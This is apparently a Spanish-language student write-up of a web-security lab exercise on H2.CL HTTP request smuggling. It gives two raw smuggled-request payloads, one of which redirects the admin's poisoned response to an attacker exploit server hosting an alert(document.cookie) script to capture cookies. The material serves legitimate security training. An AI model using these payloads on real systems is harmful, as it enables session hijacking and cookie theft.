En esta clase llevamos a cabo un ataque de request smuggling utilizando HTTP/2 con un encabezado ‘**Content-Length**‘ malicioso (H2.CL), cuyo objetivo es hacer que el navegador de la víctima cargue y ejecute un archivo JavaScript desde nuestro servidor malicioso.

Aprovechamos una redirección automática al acceder a /resources, lo que nos permite inyectar una petición que, al ser procesada por el back-end, provoca que la víctima sea redirigida al exploit server donde se aloja nuestro payload ‘**alert(document.cookie)**‘.

La clave está en enviar la petición en el momento justo en que el administrador accede a la página, ya que este tráfico será el que acabe siendo redirigido gracias a la cola de respuestas envenenada. Esta técnica requiere repetir el ataque varias veces hasta acertar con el timing exacto.

Solucion
asi que vamos hacer la configuracion de la intercepcion de la pagina principal y vamos a meter un paylaod para que nos muestre el error 404 y asi saber si es vulnerable a smuggling
![Pasted_image_20250809212331.png](/Imagenes/Pasted_image_20250809212331.png)
payload (POST / HTTP/2

Host: 0acf009104a4a3a580be0371005c0095.web-security-academy.net

Content-Length: 14



test=testing

GET /error HTTP/1.1

Host: 0acf009104a4a3a580be0371005c0095.web-security-academy.net

Content-Length: 5



x=1)
entonces en este caso a un request smugling
entonces que sigue por que en este caso nosotros no podemos copiar asi la cookie entonces lo que hacemos es investigar un poco y si miramos en el BS en el http history vemos que se esta haciendo alucion a /resources cada poco tiempo
![Pasted_image_20250809212628.png](/Imagenes/Pasted_image_20250809212628.png)
de modo que nostros no podemos hacer la peticion por medio de esta vulnerabilidad lo que podemos hacer es redireccionar nuestro payload hacia resources para ver si nos arroja el mismo error
![Pasted_image_20250809213017.png](/Imagenes/Pasted_image_20250809213017.png)
y en este caso nos arroja el 302 (entonces lo que podemos hacer es redirigir a nuestro exploit server)
pasamos a configurarlo
![Pasted_image_20250809213648.png](/Imagenes/Pasted_image_20250809213648.png)
entonces cambiamos el host hacia nuestro exploit server y le damos send
![Pasted_image_20250809213730.png](/Imagenes/Pasted_image_20250809213730.png)
ahora si le damos follow redirection
![Pasted_image_20250809214244.png](/Imagenes/Pasted_image_20250809214244.png)
payload (POST / HTTP/2

Host: 0acf009104a4a3a580be0371005c0095.web-security-academy.net

Content-Length: 14



test=testing

GET /resources HTTP/1.1

Host: exploit-0a65006b044fa3548057025e012f00fe.exploit-server.net

Content-Length: 5



x=1)
entonces es solo cuestion de esperar para poder tener respuesta de la cookie
![Pasted_image_20250809214528.png](/Imagenes/Pasted_image_20250809214528.png)
